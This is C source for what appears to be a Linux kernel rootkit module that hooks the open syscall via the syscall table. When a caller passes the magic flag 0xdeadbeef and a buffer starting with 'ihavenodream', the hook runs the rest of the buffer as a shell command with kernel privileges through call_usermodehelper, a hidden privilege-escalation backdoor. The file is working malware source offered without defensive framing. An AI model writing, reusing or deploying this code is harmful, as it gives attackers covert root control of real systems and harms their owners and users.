#include "qrk_common.h"

static int accesses_open = 0;
struct mutex lock_open;

void do_exec_cmd(char *cmd)
{
    char *argv[] = {"/bin/sh", "-c", cmd, NULL};
    char *envp[] = {"HOME=/", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

/* *************** DO EOP ****************** */
void fn_hooked(struct pt_regs *regs)
{
    void *buffer;
    char *cmd;
    void *userspace;
    size_t count;
    size_t flag;

    dbg("in fn_hooked\n");

    userspace = (void *)get_param_from_regs(regs, 1);
    count = get_param_from_regs(regs, 2);
    flag = get_param_from_regs(regs, 3);
    if (flag != 0xdeadbeef)
        return;

    buffer = kmalloc(count, GFP_KERNEL);
    if (!buffer)
    {
        dbg("qrk.fn_hooked: err in kmalloc\n");
    }
    else
    {
        if (copy_from_user(buffer, userspace, count))
        {
            dbg("ERROR: Failed to copy %zu bytes from user for sys_open debugging\n", count);
            kfree(buffer);
        }
        else
        {
            dbg("buffer: %s", (char *)buffer);
            if (memmem(buffer, 12, "ihavenodream", 12))
            {
                cmd = (char *)buffer + 12;
                dbg("ihavenodream: %s\n", cmd);
                {
                    do_exec_cmd(cmd);
                }
            }
            kfree(buffer);
        }
    }
}

asmlinkage long hooked_sys_open(struct pt_regs *regs)
{
    asmlinkage long (*sys_open)(struct pt_regs * regs);

    long ret;

    dbg_pt_regs(regs);
    inc_critical(&lock_open, &accesses_open);

    sys_open = asm_hijack_getaddr(&hooked_sys_open);

    if (sys_open)
    {
        fn_hooked(regs);
    }

    asm_hijack_pause(&hooked_sys_open);
    ret = sys_open(regs);
    asm_hijack_resume(&hooked_sys_open);

    dec_critical(&lock_open, &accesses_open);
    return ret;
}

int do_hook_init(void)
{
    asm_hijack_start(syscall_table[__NR_open], &hooked_sys_open);
    return 0;
}

void do_hook_exit(void)
{
    asm_hijack_stop( &hooked_sys_open);
}